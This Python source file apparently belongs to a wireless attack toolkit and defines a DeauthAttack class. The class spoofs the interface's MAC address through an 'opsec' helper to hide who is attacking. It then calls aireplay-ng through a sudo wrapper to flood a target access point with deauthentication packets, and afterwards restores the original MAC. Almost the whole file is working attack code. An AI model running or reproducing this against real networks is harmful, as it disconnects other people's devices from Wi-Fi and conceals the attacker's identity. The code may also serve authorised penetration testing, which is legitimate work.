import subprocess
import logging
import os # Added for os.path.join
from backend import config
from backend.plugins.opsec_utils import MACChanger
from backend.core.network_utils import interface_exists, is_monitor_mode # Import for interface checks
from backend.core.event_logger import log_event # For consistency

logger = logging.getLogger(__name__)

class DeauthAttack:
    def __init__(self, iface, target_mac, count=10):
        self.iface = iface
        self.target_mac = target_mac
        self.count = count
        self.process = None

    def run(self):
        # MACChanger calls are already updated to use sudo wrappers.
        # This method will now wrap the aireplay-ng call.
        original_mac_address = None
        mac_changer_instance = None
        mac_changed_successfully = False

        if config.MAC_CHANGE_ENABLED:
            logger.info(f"MAC_CHANGE_ENABLED is True for deauth on {self.iface}.")
            mac_changer_instance = MACChanger() # Uses sudo wrappers internally now
            if mac_changer_instance._check_macchanger_installed(): # This check might need to be script-based too eventually
                original_mac_address = mac_changer_instance.get_current_mac(self.iface)
                if original_mac_address:
                    logger.info(f"Original MAC for {self.iface}: {original_mac_address}")
                    new_mac, _ = mac_changer_instance.set_mac_random(self.iface)
                    if new_mac and new_mac.lower() != original_mac_address.lower():
                        logger.info(f"Set random MAC for {self.iface} to {new_mac} for deauth attack (via script).")
                        mac_changed_successfully = True
                    elif new_mac:
                        logger.info(f"MAC for {self.iface} is already {new_mac} or was not changed by random assignment (via script). Proceeding.")
                        mac_changed_successfully = True
                    else:
                        logger.warning(f"Failed to set random MAC for {self.iface} (via script). Attack will proceed with current/original MAC.")
                else:
                    logger.warning(f"Could not get original MAC for {self.iface} (via script). Skipping MAC change for deauth.")
            else:
                logger.warning("MACChanger utility not fully operational. Skipping MAC change for deauth.")
        else:
            logger.info("MAC_CHANGE_ENABLED is False. Skipping MAC change for deauth attack.")

        # Construct the command for the wrapper script
        script_path = os.path.join(config.WRAPPER_SCRIPT_DIR, 'run_aireplay_deauth.sh')
        cmd_wrapper = [
            config.SUDO_COMMAND, script_path,
            "--deauth", str(self.count),
            "-a", self.target_mac,
            self.iface
        ]

        current_mac_for_attack = "unknown"
        if mac_changer_instance: # Get current MAC after potential change
             current_mac_for_attack = mac_changer_instance.get_current_mac(self.iface) or "unknown_after_attempt"

        logger.info(f"Proceeding with deauth attack on {self.target_mac} via {self.iface} (MAC: {current_mac_for_attack}) for {self.count} packets. Executing via wrapper: {' '.join(cmd_wrapper)}")

        if not interface_exists(self.iface):
            logger.error(f"Interface {self.iface} does not exist right before deauth command execution.")
            log_event("deauth_attack_failed", {"interface": self.iface, "target_bssid": self.target_mac, "reason": "Interface disappeared before command"})
            if config.MAC_CHANGE_ENABLED and mac_changer_instance and original_mac_address and mac_changed_successfully:
                logger.info(f"Attempting to revert MAC for {self.iface} (via script) as attack cannot proceed.")
                mac_changer_instance.revert_to_original_mac(self.iface)
            return {"status": "error", "message": f"Interface {self.iface} disappeared before deauth command."}

        if not is_monitor_mode(self.iface):
            logger.warning(f"Interface {self.iface} is not in monitor mode right before deauth command. Attack may fail.")
            log_event("deauth_attack_warning_monitor_mode", {"interface": self.iface, "target_bssid": self.target_mac, "reason": "Not in monitor mode before command"})

        attack_result = None
        calculated_timeout = min(max(15 + int(self.count * 0.5), 20), 120)
        logger.debug(f"Calculated timeout for run_aireplay_deauth.sh script: {calculated_timeout}s for {self.count} packets.")

        try:
            # Execute the wrapper script
            result = subprocess.run(cmd_wrapper, capture_output=True, text=True, check=True,
                                    timeout=calculated_timeout, encoding='utf-8', errors='ignore')

            logger.debug(f"run_aireplay_deauth.sh stdout: {result.stdout}")
            if result.stderr:
                logger.debug(f"run_aireplay_deauth.sh stderr: {result.stderr}")

            logger.info(f"Deauth attack script for {self.iface} on {self.target_mac} executed. Check output for confirmation.")
            attack_result = {"status": "success",
                             "output": result.stdout,
                             "error_output": result.stderr,
                             "sent_count_requested": self.count,
                             "command": cmd_wrapper}

        except subprocess.CalledProcessError as e:
            logger.error(f"Deauth attack script '{' '.join(e.cmd)}' failed with code {e.returncode}", exc_info=True)
            attack_result = {"status": "error",
                             "message": e.stderr.strip() if e.stderr else "run_aireplay_deauth.sh command failed.",
                             "output": e.stdout.strip() if e.stdout else "",
                             "error_output": e.stderr.strip() if e.stderr else "",
                             "command": e.cmd,
                             "return_code": e.returncode}

        except subprocess.TimeoutExpired as e:
            logger.error(f"Deauth attack script '{' '.join(e.cmd)}' timed out after {calculated_timeout}s.", exc_info=True)
            stderr_str = e.stderr.strip() if hasattr(e, 'stderr') and e.stderr else ""
            stdout_str = e.stdout.strip() if hasattr(e, 'stdout') and e.stdout else ""
            if stdout_str: logger.error(f"Partial stdout on timeout: {stdout_str}")
            if stderr_str: logger.error(f"Partial stderr on timeout: {stderr_str}")
            attack_result = {"status": "error",
                             "message": "Deauth attack script timed out.",
                             "command": e.cmd,
                             "stderr": stderr_str,
                             "stdout": stdout_str}

        except FileNotFoundError:
            actual_cmd_not_found = cmd_wrapper[0]
            if cmd_wrapper[0] == config.SUDO_COMMAND and not os.path.exists(cmd_wrapper[1]):
                 actual_cmd_not_found = cmd_wrapper[1]
            elif cmd_wrapper[0] != config.SUDO_COMMAND and not os.path.exists(cmd_wrapper[0]):
                 actual_cmd_not_found = cmd_wrapper[0]
            logger.error(f"Command '{actual_cmd_not_found}' not found. Ensure sudo is installed and WRAPPER_SCRIPT_DIR is correct.", exc_info=True)
            attack_result = {"status": "error",
                             "message": f"Command '{actual_cmd_not_found}' not found.",
                             "command": cmd_wrapper}

        except Exception as e:
            logger.error(f"An unexpected error occurred during deauth attack (via script) with command '{' '.join(cmd_wrapper)}'", exc_info=True)
            attack_result = {"status": "error",
                             "message": f"An unexpected error occurred: {str(e)}",
                             "command": cmd_wrapper}
        finally:
            if config.MAC_CHANGE_ENABLED and mac_changer_instance and original_mac_address and mac_changed_successfully:
                current_mac_after_attack = mac_changer_instance.get_current_mac(self.iface) # Already uses wrapper
                logger.info(f"Attempting to revert MAC for {self.iface} from {current_mac_after_attack} to {original_mac_address} (via script).")
                restored_mac, _ = mac_changer_instance.revert_to_original_mac(self.iface) # Already uses wrapper
                if restored_mac and restored_mac.lower() == original_mac_address.lower():
                    logger.info(f"Successfully reverted MAC for {self.iface} to {restored_mac} (via script).")
                elif restored_mac:
                    logger.warning(f"Reverted MAC for {self.iface} to {restored_mac} (via script), but expected {original_mac_address}.")
                else:
                    logger.warning(f"Failed to revert MAC for {self.iface} to {original_mac_address} (via script). Current MAC might still be spoofed.")
            elif config.MAC_CHANGE_ENABLED and mac_changer_instance and original_mac_address and not mac_changed_successfully:
                 logger.info(f"MAC was not changed for {self.iface} (via script), no reversion needed.")

        return attack_result

    def shutdown(self):
        # This basic version doesn't have a long-running process to shut down
        # If run was using Popen, self.process.terminate() would be here
        logger.info("DeauthAttack shutdown (no active process to stop for this version).")
        pass
